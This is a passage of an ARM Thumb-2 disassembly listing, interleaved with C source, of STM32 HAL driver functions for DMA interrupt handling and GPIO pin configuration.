 80003b0:	b510      	push	{r4, lr}
  if(HAL_DMA_STATE_BUSY != hdma->State)
 80003b2:	2b02      	cmp	r3, #2
 80003b4:	d003      	beq.n	80003be <HAL_DMA_Abort_IT+0x12>
    hdma->ErrorCode = HAL_DMA_ERROR_NO_XFER;
 80003b6:	2304      	movs	r3, #4
 80003b8:	6383      	str	r3, [r0, #56]	; 0x38
    status = HAL_ERROR;
 80003ba:	2001      	movs	r0, #1
 80003bc:	bd10      	pop	{r4, pc}
    __HAL_DMA_DISABLE_IT(hdma, (DMA_IT_TC | DMA_IT_HT | DMA_IT_TE));
 80003be:	6803      	ldr	r3, [r0, #0]
 80003c0:	681a      	ldr	r2, [r3, #0]
 80003c2:	f022 020e 	bic.w	r2, r2, #14
 80003c6:	601a      	str	r2, [r3, #0]
    __HAL_DMA_DISABLE(hdma);
 80003c8:	681a      	ldr	r2, [r3, #0]
 80003ca:	f022 0201 	bic.w	r2, r2, #1
 80003ce:	601a      	str	r2, [r3, #0]
    __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_GI_FLAG_INDEX(hdma));
 80003d0:	4a18      	ldr	r2, [pc, #96]	; (8000434 <HAL_DMA_Abort_IT+0x88>)
 80003d2:	4293      	cmp	r3, r2
 80003d4:	d01f      	beq.n	8000416 <HAL_DMA_Abort_IT+0x6a>
 80003d6:	3214      	adds	r2, #20
 80003d8:	4293      	cmp	r3, r2
 80003da:	d01e      	beq.n	800041a <HAL_DMA_Abort_IT+0x6e>
 80003dc:	3214      	adds	r2, #20
 80003de:	4293      	cmp	r3, r2
 80003e0:	d01d      	beq.n	800041e <HAL_DMA_Abort_IT+0x72>
 80003e2:	3214      	adds	r2, #20
 80003e4:	4293      	cmp	r3, r2
 80003e6:	d01d      	beq.n	8000424 <HAL_DMA_Abort_IT+0x78>
 80003e8:	3214      	adds	r2, #20
 80003ea:	4293      	cmp	r3, r2
 80003ec:	d01d      	beq.n	800042a <HAL_DMA_Abort_IT+0x7e>
 80003ee:	3214      	adds	r2, #20
 80003f0:	4293      	cmp	r3, r2
 80003f2:	bf0c      	ite	eq
 80003f4:	f44f 1380 	moveq.w	r3, #1048576	; 0x100000
 80003f8:	f04f 7380 	movne.w	r3, #16777216	; 0x1000000
 80003fc:	4a0e      	ldr	r2, [pc, #56]	; (8000438 <HAL_DMA_Abort_IT+0x8c>)
    __HAL_UNLOCK(hdma);
 80003fe:	2400      	movs	r4, #0
    __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_GI_FLAG_INDEX(hdma));
 8000400:	6053      	str	r3, [r2, #4]
    hdma->State = HAL_DMA_STATE_READY;
 8000402:	2301      	movs	r3, #1
 8000404:	f880 3021 	strb.w	r3, [r0, #33]	; 0x21
    if(hdma->XferAbortCallback != NULL)
 8000408:	6b43      	ldr	r3, [r0, #52]	; 0x34
    __HAL_UNLOCK(hdma);
 800040a:	f880 4020 	strb.w	r4, [r0, #32]
    if(hdma->XferAbortCallback != NULL)
 800040e:	b17b      	cbz	r3, 8000430 <HAL_DMA_Abort_IT+0x84>
      hdma->XferAbortCallback(hdma);
 8000410:	4798      	blx	r3
  HAL_StatusTypeDef status = HAL_OK;
 8000412:	4620      	mov	r0, r4
 8000414:	bd10      	pop	{r4, pc}
    __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_GI_FLAG_INDEX(hdma));
 8000416:	2301      	movs	r3, #1
 8000418:	e7f0      	b.n	80003fc <HAL_DMA_Abort_IT+0x50>
 800041a:	2310      	movs	r3, #16
 800041c:	e7ee      	b.n	80003fc <HAL_DMA_Abort_IT+0x50>
 800041e:	f44f 7380 	mov.w	r3, #256	; 0x100
 8000422:	e7eb      	b.n	80003fc <HAL_DMA_Abort_IT+0x50>
 8000424:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000428:	e7e8      	b.n	80003fc <HAL_DMA_Abort_IT+0x50>
 800042a:	f44f 3380 	mov.w	r3, #65536	; 0x10000
 800042e:	e7e5      	b.n	80003fc <HAL_DMA_Abort_IT+0x50>
  HAL_StatusTypeDef status = HAL_OK;
 8000430:	4618      	mov	r0, r3
}
 8000432:	bd10      	pop	{r4, pc}
 8000434:	40020008 	.word	0x40020008
 8000438:	40020000 	.word	0x40020000

0800043c <HAL_DMA_IRQHandler>:
{
 800043c:	b470      	push	{r4, r5, r6}
  if (((flag_it & (DMA_FLAG_HT1 << hdma->ChannelIndex)) != RESET) && ((source_it & DMA_IT_HT) != RESET))
 800043e:	2504      	movs	r5, #4
  uint32_t flag_it = hdma->DmaBaseAddress->ISR;
 8000440:	6bc6      	ldr	r6, [r0, #60]	; 0x3c
  if (((flag_it & (DMA_FLAG_HT1 << hdma->ChannelIndex)) != RESET) && ((source_it & DMA_IT_HT) != RESET))
 8000442:	6c02      	ldr	r2, [r0, #64]	; 0x40
  uint32_t flag_it = hdma->DmaBaseAddress->ISR;
 8000444:	6834      	ldr	r4, [r6, #0]
  uint32_t source_it = hdma->Instance->CCR;
 8000446:	6803      	ldr	r3, [r0, #0]
  if (((flag_it & (DMA_FLAG_HT1 << hdma->ChannelIndex)) != RESET) && ((source_it & DMA_IT_HT) != RESET))
 8000448:	4095      	lsls	r5, r2
 800044a:	4225      	tst	r5, r4
  uint32_t source_it = hdma->Instance->CCR;
 800044c:	6819      	ldr	r1, [r3, #0]
  if (((flag_it & (DMA_FLAG_HT1 << hdma->ChannelIndex)) != RESET) && ((source_it & DMA_IT_HT) != RESET))
 800044e:	d032      	beq.n	80004b6 <HAL_DMA_IRQHandler+0x7a>
 8000450:	074d      	lsls	r5, r1, #29
 8000452:	d530      	bpl.n	80004b6 <HAL_DMA_IRQHandler+0x7a>
    if((hdma->Instance->CCR & DMA_CCR_CIRC) == 0U)
 8000454:	681a      	ldr	r2, [r3, #0]
 8000456:	0696      	lsls	r6, r2, #26
      __HAL_DMA_DISABLE_IT(hdma, DMA_IT_HT);
 8000458:	bf5e      	ittt	pl
 800045a:	681a      	ldrpl	r2, [r3, #0]
 800045c:	f022 0204 	bicpl.w	r2, r2, #4
 8000460:	601a      	strpl	r2, [r3, #0]
    __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_HT_FLAG_INDEX(hdma));
 8000462:	4a3e      	ldr	r2, [pc, #248]	; (800055c <HAL_DMA_IRQHandler+0x120>)
 8000464:	4293      	cmp	r3, r2
 8000466:	d019      	beq.n	800049c <HAL_DMA_IRQHandler+0x60>
 8000468:	3214      	adds	r2, #20
 800046a:	4293      	cmp	r3, r2
 800046c:	d018      	beq.n	80004a0 <HAL_DMA_IRQHandler+0x64>
 800046e:	3214      	adds	r2, #20
 8000470:	4293      	cmp	r3, r2
 8000472:	d017      	beq.n	80004a4 <HAL_DMA_IRQHandler+0x68>
 8000474:	3214      	adds	r2, #20
 8000476:	4293      	cmp	r3, r2
 8000478:	d017      	beq.n	80004aa <HAL_DMA_IRQHandler+0x6e>
 800047a:	3214      	adds	r2, #20
 800047c:	4293      	cmp	r3, r2
 800047e:	d017      	beq.n	80004b0 <HAL_DMA_IRQHandler+0x74>
 8000480:	3214      	adds	r2, #20
 8000482:	4293      	cmp	r3, r2
 8000484:	bf0c      	ite	eq
 8000486:	f44f 0380 	moveq.w	r3, #4194304	; 0x400000
 800048a:	f04f 6380 	movne.w	r3, #67108864	; 0x4000000
 800048e:	4a34      	ldr	r2, [pc, #208]	; (8000560 <HAL_DMA_IRQHandler+0x124>)
 8000490:	6053      	str	r3, [r2, #4]
    if(hdma->XferHalfCpltCallback != NULL)
 8000492:	6ac3      	ldr	r3, [r0, #44]	; 0x2c
    if (hdma->XferErrorCallback != NULL)
 8000494:	2b00      	cmp	r3, #0
 8000496:	d05e      	beq.n	8000556 <HAL_DMA_IRQHandler+0x11a>
}
 8000498:	bc70      	pop	{r4, r5, r6}
      hdma->XferErrorCallback(hdma);
 800049a:	4718      	bx	r3
    __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_HT_FLAG_INDEX(hdma));
 800049c:	2304      	movs	r3, #4
 800049e:	e7f6      	b.n	800048e <HAL_DMA_IRQHandler+0x52>
 80004a0:	2340      	movs	r3, #64	; 0x40
 80004a2:	e7f4      	b.n	800048e <HAL_DMA_IRQHandler+0x52>
 80004a4:	f44f 6380 	mov.w	r3, #1024	; 0x400
 80004a8:	e7f1      	b.n	800048e <HAL_DMA_IRQHandler+0x52>
 80004aa:	f44f 4380 	mov.w	r3, #16384	; 0x4000
 80004ae:	e7ee      	b.n	800048e <HAL_DMA_IRQHandler+0x52>
 80004b0:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 80004b4:	e7eb      	b.n	800048e <HAL_DMA_IRQHandler+0x52>
  else if (((flag_it & (DMA_FLAG_TC1 << hdma->ChannelIndex)) != RESET) && ((source_it & DMA_IT_TC) != RESET))
 80004b6:	2502      	movs	r5, #2
 80004b8:	4095      	lsls	r5, r2
 80004ba:	4225      	tst	r5, r4
 80004bc:	d035      	beq.n	800052a <HAL_DMA_IRQHandler+0xee>
 80004be:	078d      	lsls	r5, r1, #30
 80004c0:	d533      	bpl.n	800052a <HAL_DMA_IRQHandler+0xee>
    if((hdma->Instance->CCR & DMA_CCR_CIRC) == 0U)
 80004c2:	681a      	ldr	r2, [r3, #0]
 80004c4:	0694      	lsls	r4, r2, #26
 80004c6:	d406      	bmi.n	80004d6 <HAL_DMA_IRQHandler+0x9a>
      __HAL_DMA_DISABLE_IT(hdma, DMA_IT_TE | DMA_IT_TC);  
 80004c8:	681a      	ldr	r2, [r3, #0]
 80004ca:	f022 020a 	bic.w	r2, r2, #10
 80004ce:	601a      	str	r2, [r3, #0]
      hdma->State = HAL_DMA_STATE_READY;
 80004d0:	2201      	movs	r2, #1
 80004d2:	f880 2021 	strb.w	r2, [r0, #33]	; 0x21
      __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_TC_FLAG_INDEX(hdma));
 80004d6:	4a21      	ldr	r2, [pc, #132]	; (800055c <HAL_DMA_IRQHandler+0x120>)
 80004d8:	4293      	cmp	r3, r2
 80004da:	d019      	beq.n	8000510 <HAL_DMA_IRQHandler+0xd4>
 80004dc:	3214      	adds	r2, #20
 80004de:	4293      	cmp	r3, r2
 80004e0:	d018      	beq.n	8000514 <HAL_DMA_IRQHandler+0xd8>
 80004e2:	3214      	adds	r2, #20
 80004e4:	4293      	cmp	r3, r2
 80004e6:	d017      	beq.n	8000518 <HAL_DMA_IRQHandler+0xdc>
 80004e8:	3214      	adds	r2, #20
 80004ea:	4293      	cmp	r3, r2
 80004ec:	d017      	beq.n	800051e <HAL_DMA_IRQHandler+0xe2>
 80004ee:	3214      	adds	r2, #20
 80004f0:	4293      	cmp	r3, r2
 80004f2:	d017      	beq.n	8000524 <HAL_DMA_IRQHandler+0xe8>
 80004f4:	3214      	adds	r2, #20
 80004f6:	4293      	cmp	r3, r2
 80004f8:	bf0c      	ite	eq
 80004fa:	f44f 1300 	moveq.w	r3, #2097152	; 0x200000
 80004fe:	f04f 7300 	movne.w	r3, #33554432	; 0x2000000
 8000502:	4a17      	ldr	r2, [pc, #92]	; (8000560 <HAL_DMA_IRQHandler+0x124>)
 8000504:	6053      	str	r3, [r2, #4]
    __HAL_UNLOCK(hdma);
 8000506:	2300      	movs	r3, #0
 8000508:	f880 3020 	strb.w	r3, [r0, #32]
    if(hdma->XferCpltCallback != NULL)
 800050c:	6a83      	ldr	r3, [r0, #40]	; 0x28
 800050e:	e7c1      	b.n	8000494 <HAL_DMA_IRQHandler+0x58>
      __HAL_DMA_CLEAR_FLAG(hdma, __HAL_DMA_GET_TC_FLAG_INDEX(hdma));
 8000510:	2302      	movs	r3, #2
 8000512:	e7f6      	b.n	8000502 <HAL_DMA_IRQHandler+0xc6>
 8000514:	2320      	movs	r3, #32
 8000516:	e7f4      	b.n	8000502 <HAL_DMA_IRQHandler+0xc6>
 8000518:	f44f 7300 	mov.w	r3, #512	; 0x200
 800051c:	e7f1      	b.n	8000502 <HAL_DMA_IRQHandler+0xc6>
 800051e:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 8000522:	e7ee      	b.n	8000502 <HAL_DMA_IRQHandler+0xc6>
 8000524:	f44f 3300 	mov.w	r3, #131072	; 0x20000
 8000528:	e7eb      	b.n	8000502 <HAL_DMA_IRQHandler+0xc6>
  else if (( RESET != (flag_it & (DMA_FLAG_TE1 << hdma->ChannelIndex))) && (RESET != (source_it & DMA_IT_TE)))
 800052a:	2508      	movs	r5, #8
 800052c:	4095      	lsls	r5, r2
 800052e:	4225      	tst	r5, r4
 8000530:	d011      	beq.n	8000556 <HAL_DMA_IRQHandler+0x11a>
 8000532:	0709      	lsls	r1, r1, #28
 8000534:	d50f      	bpl.n	8000556 <HAL_DMA_IRQHandler+0x11a>
    __HAL_DMA_DISABLE_IT(hdma, (DMA_IT_TC | DMA_IT_HT | DMA_IT_TE));
 8000536:	6819      	ldr	r1, [r3, #0]
 8000538:	f021 010e 	bic.w	r1, r1, #14
 800053c:	6019      	str	r1, [r3, #0]
    hdma->DmaBaseAddress->IFCR = (DMA_ISR_GIF1 << hdma->ChannelIndex);
 800053e:	2301      	movs	r3, #1
 8000540:	fa03 f202 	lsl.w	r2, r3, r2
 8000544:	6072      	str	r2, [r6, #4]
    hdma->ErrorCode = HAL_DMA_ERROR_TE;
 8000546:	6383      	str	r3, [r0, #56]	; 0x38
    hdma->State = HAL_DMA_STATE_READY;
 8000548:	f880 3021 	strb.w	r3, [r0, #33]	; 0x21
    __HAL_UNLOCK(hdma);
 800054c:	2300      	movs	r3, #0
 800054e:	f880 3020 	strb.w	r3, [r0, #32]
    if (hdma->XferErrorCallback != NULL)
 8000552:	6b03      	ldr	r3, [r0, #48]	; 0x30
 8000554:	e79e      	b.n	8000494 <HAL_DMA_IRQHandler+0x58>
}
 8000556:	bc70      	pop	{r4, r5, r6}
 8000558:	4770      	bx	lr
 800055a:	bf00      	nop
 800055c:	40020008 	.word	0x40020008
 8000560:	40020000 	.word	0x40020000

08000564 <HAL_GPIO_Init>:
  * @param  GPIO_Init: pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8000564:	e92d 4ff7 	stmdb	sp!, {r0, r1, r2, r4, r5, r6, r7, r8, r9, sl, fp, lr}
  uint32_t position;
  uint32_t ioposition = 0x00U;
  uint32_t iocurrent = 0x00U;
  uint32_t temp = 0x00U;
  uint32_t config = 0x00U;
 8000568:	2200      	movs	r2, #0
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  for (position = 0U; position < GPIO_NUMBER; position++)
 800056a:	4616      	mov	r6, r2
 800056c:	4b65      	ldr	r3, [pc, #404]	; (8000704 <HAL_GPIO_Init+0x1a0>)
    {
      /* Check the Alternate function parameters */
      assert_param(IS_GPIO_AF_INSTANCE(GPIOx));

      /* Based on the required mode, filling config variable with MODEy[1:0] and CNFy[3:2] corresponding bits */
      switch (GPIO_Init->Mode)
 800056e:	f8df e1a4 	ldr.w	lr, [pc, #420]	; 8000714 <HAL_GPIO_Init+0x1b0>
 8000572:	f8df c1a4 	ldr.w	ip, [pc, #420]	; 8000718 <HAL_GPIO_Init+0x1b4>
    ioposition = (0x01U << position);
 8000576:	f04f 0801 	mov.w	r8, #1
    iocurrent = (uint32_t)(GPIO_Init->Pin) & ioposition;
 800057a:	680c      	ldr	r4, [r1, #0]
    ioposition = (0x01U << position);
 800057c:	fa08 f806 	lsl.w	r8, r8, r6
    iocurrent = (uint32_t)(GPIO_Init->Pin) & ioposition;
 8000580:	ea08 0404 	and.w	r4, r8, r4
    if (iocurrent == ioposition)
 8000584:	45a0      	cmp	r8, r4
 8000586:	d17f      	bne.n	8000688 <HAL_GPIO_Init+0x124>
      switch (GPIO_Init->Mode)
 8000588:	684d      	ldr	r5, [r1, #4]
 800058a:	2d12      	cmp	r5, #18
 800058c:	f000 80af 	beq.w	80006ee <HAL_GPIO_Init+0x18a>
 8000590:	f200 8088 	bhi.w	80006a4 <HAL_GPIO_Init+0x140>
 8000594:	2d02      	cmp	r5, #2
 8000596:	f000 80a7 	beq.w	80006e8 <HAL_GPIO_Init+0x184>
 800059a:	d87c      	bhi.n	8000696 <HAL_GPIO_Init+0x132>
 800059c:	2d00      	cmp	r5, #0
 800059e:	f000 808e 	beq.w	80006be <HAL_GPIO_Init+0x15a>
 80005a2:	2d01      	cmp	r5, #1
 80005a4:	f000 809e 	beq.w	80006e4 <HAL_GPIO_Init+0x180>
       in order to address CRH or CRL register*/
      configregister = (iocurrent < GPIO_PIN_8) ? &GPIOx->CRL     : &GPIOx->CRH;
      registeroffset = (iocurrent < GPIO_PIN_8) ? (position << 2U) : ((position - 8U) << 2U);

      /* Apply the new configuration of the pin to the register */
      MODIFY_REG((*configregister), ((GPIO_CRL_MODE0 | GPIO_CRL_CNF0) << registeroffset), (config << registeroffset));
 80005a8:	f04f 090f 	mov.w	r9, #15
      configregister = (iocurrent < GPIO_PIN_8) ? &GPIOx->CRL     : &GPIOx->CRH;
 80005ac:	2cff      	cmp	r4, #255	; 0xff
 80005ae:	bf93      	iteet	ls
 80005b0:	4682      	movls	sl, r0
 80005b2:	f106 4580 	addhi.w	r5, r6, #1073741824	; 0x40000000
 80005b6:	3d08      	subhi	r5, #8
 80005b8:	f8d0 b000 	ldrls.w	fp, [r0]
 80005bc:	bf92      	itee	ls
 80005be:	00b5      	lslls	r5, r6, #2
 80005c0:	f8d0 b004 	ldrhi.w	fp, [r0, #4]
 80005c4:	00ad      	lslhi	r5, r5, #2
      MODIFY_REG((*configregister), ((GPIO_CRL_MODE0 | GPIO_CRL_CNF0) << registeroffset), (config << registeroffset));
 80005c6:	fa09 f805 	lsl.w	r8, r9, r5
 80005ca:	ea2b 0808 	bic.w	r8, fp, r8
 80005ce:	fa02 f505 	lsl.w	r5, r2, r5
      configregister = (iocurrent < GPIO_PIN_8) ? &GPIOx->CRL     : &GPIOx->CRH;
 80005d2:	bf88      	it	hi
 80005d4:	f100 0a04 	addhi.w	sl, r0, #4
      MODIFY_REG((*configregister), ((GPIO_CRL_MODE0 | GPIO_CRL_CNF0) << registeroffset), (config << registeroffset));
 80005d8:	ea48 0505 	orr.w	r5, r8, r5
 80005dc:	f8ca 5000 	str.w	r5, [sl]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) == EXTI_MODE)
 80005e0:	f8d1 a004 	ldr.w	sl, [r1, #4]
 80005e4:	f01a 5f80 	tst.w	sl, #268435456	; 0x10000000
 80005e8:	d04e      	beq.n	8000688 <HAL_GPIO_Init+0x124>
      {
        /* Enable AFIO Clock */
        __HAL_RCC_AFIO_CLK_ENABLE();
 80005ea:	4d47      	ldr	r5, [pc, #284]	; (8000708 <HAL_GPIO_Init+0x1a4>)
 80005ec:	4f46      	ldr	r7, [pc, #280]	; (8000708 <HAL_GPIO_Init+0x1a4>)
 80005ee:	69ad      	ldr	r5, [r5, #24]
 80005f0:	f026 0803 	bic.w	r8, r6, #3
 80005f4:	f045 0501 	orr.w	r5, r5, #1
 80005f8:	61bd      	str	r5, [r7, #24]
 80005fa:	69bd      	ldr	r5, [r7, #24]
 80005fc:	f108 4880 	add.w	r8, r8, #1073741824	; 0x40000000
 8000600:	f005 0501 	and.w	r5, r5, #1
 8000604:	9501      	str	r5, [sp, #4]
 8000606:	f508 3880 	add.w	r8, r8, #65536	; 0x10000
        temp = AFIO->EXTICR[position >> 2U];
        CLEAR_BIT(temp, (0x0FU) << (4U * (position & 0x03U)));
 800060a:	f006 0b03 	and.w	fp, r6, #3
        __HAL_RCC_AFIO_CLK_ENABLE();
 800060e:	9d01      	ldr	r5, [sp, #4]
        CLEAR_BIT(temp, (0x0FU) << (4U * (position & 0x03U)));
 8000610:	ea4f 0b8b 	mov.w	fp, fp, lsl #2
        temp = AFIO->EXTICR[position >> 2U];
 8000614:	f8d8 5008 	ldr.w	r5, [r8, #8]
        CLEAR_BIT(temp, (0x0FU) << (4U * (position & 0x03U)));
 8000618:	fa09 f90b 	lsl.w	r9, r9, fp
 800061c:	ea25 0909 	bic.w	r9, r5, r9
        SET_BIT(temp, (GPIO_GET_INDEX(GPIOx)) << (4U * (position & 0x03U)));
 8000620:	4d3a      	ldr	r5, [pc, #232]	; (800070c <HAL_GPIO_Init+0x1a8>)
 8000622:	42a8      	cmp	r0, r5
 8000624:	d068      	beq.n	80006f8 <HAL_GPIO_Init+0x194>
 8000626:	f505 6580 	add.w	r5, r5, #1024	; 0x400
 800062a:	42a8      	cmp	r0, r5
 800062c:	d066      	beq.n	80006fc <HAL_GPIO_Init+0x198>
 800062e:	f505 6580 	add.w	r5, r5, #1024	; 0x400
 8000632:	42a8      	cmp	r0, r5
 8000634:	d064      	beq.n	8000700 <HAL_GPIO_Init+0x19c>
 8000636:	f505 6580 	add.w	r5, r5, #1024	; 0x400
 800063a:	42a8      	cmp	r0, r5
 800063c:	bf0c      	ite	eq
 800063e:	2503      	moveq	r5, #3
 8000640:	2504      	movne	r5, #4
 8000642:	fa05 f50b 	lsl.w	r5, r5, fp
 8000646:	ea45 0509 	orr.w	r5, r5, r9
        AFIO->EXTICR[position >> 2U] = temp;
 800064a:	f8c8 5008 	str.w	r5, [r8, #8]


        /* Configure the interrupt mask */
        if ((GPIO_Init->Mode & GPIO_MODE_IT) == GPIO_MODE_IT)
        {
          SET_BIT(EXTI->IMR, iocurrent);
 800064e:	681d      	ldr	r5, [r3, #0]
        if ((GPIO_Init->Mode & GPIO_MODE_IT) == GPIO_MODE_IT)
 8000650:	f41a 3f80 	tst.w	sl, #65536	; 0x10000
          SET_BIT(EXTI->IMR, iocurrent);
 8000654:	bf14      	ite	ne
 8000656:	4325      	orrne	r5, r4
        }
        else
        {
          CLEAR_BIT(EXTI->IMR, iocurrent);
 8000658:	43a5      	biceq	r5, r4
 800065a:	601d      	str	r5, [r3, #0]
        }

        /* Configure the event mask */
        if ((GPIO_Init->Mode & GPIO_MODE_EVT) == GPIO_MODE_EVT)
        {
          SET_BIT(EXTI->EMR, iocurrent);
 800065c:	685d      	ldr	r5, [r3, #4]
        if ((GPIO_Init->Mode & GPIO_MODE_EVT) == GPIO_MODE_EVT)
 800065e:	f41a 3f00 	tst.w	sl, #131072	; 0x20000
          SET_BIT(EXTI->EMR, iocurrent);
 8000662:	bf14      	ite	ne
 8000664:	4325      	orrne	r5, r4
        }
        else
        {
          CLEAR_BIT(EXTI->EMR, iocurrent);
 8000666:	43a5      	biceq	r5, r4
 8000668:	605d      	str	r5, [r3, #4]
        }

        /* Enable or disable the rising trigger */
        if ((GPIO_Init->Mode & RISING_EDGE) == RISING_EDGE)
        {
          SET_BIT(EXTI->RTSR, iocurrent);
 800066a:	689d      	ldr	r5, [r3, #8]
        if ((GPIO_Init->Mode & RISING_EDGE) == RISING_EDGE)
 800066c:	f41a 1f80 	tst.w	sl, #1048576	; 0x100000
          SET_BIT(EXTI->RTSR, iocurrent);
 8000670:	bf14      	ite	ne
 8000672:	4325      	orrne	r5, r4
        }
        else
        {
          CLEAR_BIT(EXTI->RTSR, iocurrent);
 8000674:	43a5      	biceq	r5, r4
 8000676:	609d      	str	r5, [r3, #8]
        }

        /* Enable or disable the falling trigger */
        if ((GPIO_Init->Mode & FALLING_EDGE) == FALLING_EDGE)
        {
          SET_BIT(EXTI->FTSR, iocurrent);
 8000678:	68dd      	ldr	r5, [r3, #12]
        if ((GPIO_Init->Mode & FALLING_EDGE) == FALLING_EDGE)
 800067a:	f41a 1f00 	tst.w	sl, #2097152	; 0x200000
          SET_BIT(EXTI->FTSR, iocurrent);
 800067e:	bf14      	ite	ne
 8000680:	432c      	orrne	r4, r5
        }
        else
        {
          CLEAR_BIT(EXTI->FTSR, iocurrent);
 8000682:	ea25 0404 	biceq.w	r4, r5, r4
 8000686:	60dc      	str	r4, [r3, #12]
  for (position = 0U; position < GPIO_NUMBER; position++)
 8000688:	3601      	adds	r6, #1
 800068a:	2e10      	cmp	r6, #16
 800068c:	f47f af73 	bne.w	8000576 <HAL_GPIO_Init+0x12>
        }
      }
    }
  }
}
 8000690:	b003      	add	sp, #12
 8000692:	e8bd 8ff0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, fp, pc}
      switch (GPIO_Init->Mode)
 8000696:	2d03      	cmp	r5, #3
 8000698:	d022      	beq.n	80006e0 <HAL_GPIO_Init+0x17c>
 800069a:	2d11      	cmp	r5, #17
 800069c:	d184      	bne.n	80005a8 <HAL_GPIO_Init+0x44>
          config = GPIO_Init->Speed + GPIO_CR_CNF_GP_OUTPUT_OD;
 800069e:	68ca      	ldr	r2, [r1, #12]
 80006a0:	3204      	adds	r2, #4
          break;
 80006a2:	e781      	b.n	80005a8 <HAL_GPIO_Init+0x44>
      switch (GPIO_Init->Mode)
 80006a4:	4f1a      	ldr	r7, [pc, #104]	; (8000710 <HAL_GPIO_Init+0x1ac>)
 80006a6:	42bd      	cmp	r5, r7
 80006a8:	d009      	beq.n	80006be <HAL_GPIO_Init+0x15a>
 80006aa:	d812      	bhi.n	80006d2 <HAL_GPIO_Init+0x16e>
 80006ac:	f8df 906c 	ldr.w	r9, [pc, #108]	; 800071c <HAL_GPIO_Init+0x1b8>
 80006b0:	454d      	cmp	r5, r9
 80006b2:	d004      	beq.n	80006be <HAL_GPIO_Init+0x15a>
 80006b4:	f509 3980 	add.w	r9, r9, #65536	; 0x10000
 80006b8:	454d      	cmp	r5, r9
 80006ba:	f47f af75 	bne.w	80005a8 <HAL_GPIO_Init+0x44>
          if (GPIO_Init->Pull == GPIO_NOPULL)
 80006be:	688a      	ldr	r2, [r1, #8]
 80006c0:	b1c2      	cbz	r2, 80006f4 <HAL_GPIO_Init+0x190>
          else if (GPIO_Init->Pull == GPIO_PULLUP)
 80006c2:	2a01      	cmp	r2, #1
            GPIOx->BSRR = ioposition;
 80006c4:	bf0c      	ite	eq
 80006c6:	f8c0 8010 	streq.w	r8, [r0, #16]
            GPIOx->BRR = ioposition;
 80006ca:	f8c0 8014 	strne.w	r8, [r0, #20]
            config = GPIO_CR_MODE_INPUT + GPIO_CR_CNF_INPUT_PU_PD;
 80006ce:	2208      	movs	r2, #8
 80006d0:	e76a      	b.n	80005a8 <HAL_GPIO_Init+0x44>
      switch (GPIO_Init->Mode)
 80006d2:	4575      	cmp	r5, lr
 80006d4:	d0f3      	beq.n	80006be <HAL_GPIO_Init+0x15a>
 80006d6:	4565      	cmp	r5, ip
 80006d8:	d0f1      	beq.n	80006be <HAL_GPIO_Init+0x15a>
 80006da:	f8df 9044 	ldr.w	r9, [pc, #68]	; 8000720 <HAL_GPIO_Init+0x1bc>
 80006de:	e7eb      	b.n	80006b8 <HAL_GPIO_Init+0x154>
          config = GPIO_CR_MODE_INPUT + GPIO_CR_CNF_ANALOG;
 80006e0:	2200      	movs	r2, #0
 80006e2:	e761      	b.n	80005a8 <HAL_GPIO_Init+0x44>
          config = GPIO_Init->Speed + GPIO_CR_CNF_GP_OUTPUT_PP;
 80006e4:	68ca      	ldr	r2, [r1, #12]
          break;
 80006e6:	e75f      	b.n	80005a8 <HAL_GPIO_Init+0x44>
          config = GPIO_Init->Speed + GPIO_CR_CNF_AF_OUTPUT_PP;
 80006e8:	68ca      	ldr	r2, [r1, #12]
 80006ea:	3208      	adds	r2, #8
          break;
 80006ec:	e75c      	b.n	80005a8 <HAL_GPIO_Init+0x44>
          config = GPIO_Init->Speed + GPIO_CR_CNF_AF_OUTPUT_OD;
 80006ee:	68ca      	ldr	r2, [r1, #12]
 80006f0:	320c      	adds	r2, #12
          break;
 80006f2:	e759      	b.n	80005a8 <HAL_GPIO_Init+0x44>
            config = GPIO_CR_MODE_INPUT + GPIO_CR_CNF_INPUT_FLOATING;
 80006f4:	2204      	movs	r2, #4
 80006f6:	e757      	b.n	80005a8 <HAL_GPIO_Init+0x44>
        SET_BIT(temp, (GPIO_GET_INDEX(GPIOx)) << (4U * (position & 0x03U)));
 80006f8:	2500      	movs	r5, #0
 80006fa:	e7a2      	b.n	8000642 <HAL_GPIO_Init+0xde>
 80006fc:	2501      	movs	r5, #1
 80006fe:	e7a0      	b.n	8000642 <HAL_GPIO_Init+0xde>
 8000700:	2502      	movs	r5, #2
 8000702:	e79e      	b.n	8000642 <HAL_GPIO_Init+0xde>
 8000704:	40010400 	.word	0x40010400
 8000708:	40021000 	.word	0x40021000
 800070c:	40010800 	.word	0x40010800
 8000710:	10210000 	.word	0x10210000
 8000714:	10310000 	.word	0x10310000
 8000718:	10320000 	.word	0x10320000
 800071c:	10110000 	.word	0x10110000
 8000720:	10220000 	.word	0x10220000

08000724 <HAL_GPIO_TogglePin>:
void HAL_GPIO_TogglePin(GPIO_TypeDef *GPIOx, uint16_t GPIO_Pin)
{
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));

  GPIOx->ODR ^= GPIO_Pin;
 8000724:	68c3      	ldr	r3, [r0, #12]
 8000726:	4059      	eors	r1, r3
 8000728:	60c1      	str	r1, [r0, #12]
 800072a:	4770      	bx	lr

0800072c <HAL_RCC_OscConfig>:
  /* Check the parameters */
  assert_param(RCC_OscInitStruct != NULL);
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));
  
  /*------------------------------- HSE Configuration ------------------------*/
